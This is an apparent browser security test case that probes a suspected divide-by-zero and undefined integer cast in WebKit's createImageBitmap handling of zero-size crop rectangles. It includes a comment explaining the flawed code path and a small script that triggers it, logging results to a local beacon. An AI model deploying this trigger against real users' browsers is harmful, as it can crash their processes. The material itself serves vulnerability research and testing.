// c028: createImageBitmap divides by a zero-size source rectangle.
//
// html/ImageBitmap.cpp:
//   croppedSourceRectangleWithFormatting() validates only that resizeWidth/resizeHeight are > 0, then
//   intersects the attacker's crop rect with the image. An empty result is accepted.
//   outputSizeForSourceRectangle() then does:
//       resizeWidth  absent, resizeHeight present -> ceil(width  * resizeHeight / height)   <- /0 when height==0
//       resizeHeight absent, resizeWidth  present -> ceil(height * resizeWidth  / width)    <- /0 when width==0
//   and casts the double straight to int, so inf/NaN becomes INT_MIN (UB).
//
// No isEmpty() check exists anywhere in ImageBitmap.cpp, so this applies to every source type.
// Expected benign outcome is a rejected promise (null image buffer); the interesting outcomes are a
// process death or a bitmap with nonsensical dimensions.
(function () {
  var LOG = [];
  function note(s) { LOG.push(s); }
  function flush() { for (var i = 0; i < LOG.length; i++) { try { navigator.sendBeacon('/beacon', 'c028-' + LOG[i]); } catch (e) {} } }

  // 8x8 checkerboard PNG, inline
  var PNG = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAYAAADED76LAAAAJUlEQVR42mNkYPhfz0AEYBxVSF+FjIyMDP8ZGRn+MzIy/GdkZPgPAG1jCAF9t3m3AAAAAElFTkSuQmCC';

  function attempt(tag, args, opts) {
    return new Promise(function (resolve) {
      var img = new Image();
      img.onload = function () {
        var p;
        try { p = createImageBitmap(img, args[0], args[1], args[2], args[3], opts); }
        catch (e) { note(tag + ' threw-sync:' + e.name); return resolve(); }
        p.then(function (bm) {
          note(tag + ' resolved ' + bm.width + 'x' + bm.height);
          resolve();
        }, function (e) { note(tag + ' rejected:' + e.name); resolve(); });
      };
      img.onerror = function () { note(tag + ' img-load-failed'); resolve(); };
      img.src = PNG;
    });
  }

  (async function () {
    note('boot');
    if (typeof createImageBitmap !== 'function') { note('no-createImageBitmap'); flush(); return; }
    note('api-ok');

    await attempt('CTRL-valid', [0, 0, 8, 8], { resizeHeight: 64 });          // control: normal
    await attempt('A-zeroheight', [0, 0, 8, 0], { resizeHeight: 64 });        // /0 on height
    await attempt('B-zerowidth', [0, 0, 0, 8], { resizeWidth: 64 });          // /0 on width
    await attempt('C-outside', [-100, -100, 8, 8], { resizeHeight: 64 });     // crop entirely outside -> empty
    await attempt('D-zero-both', [0, 0, 0, 0], { resizeWidth: 64, resizeHeight: 64 }); // both given: no division

    note('done');
    flush();
  })();
})();
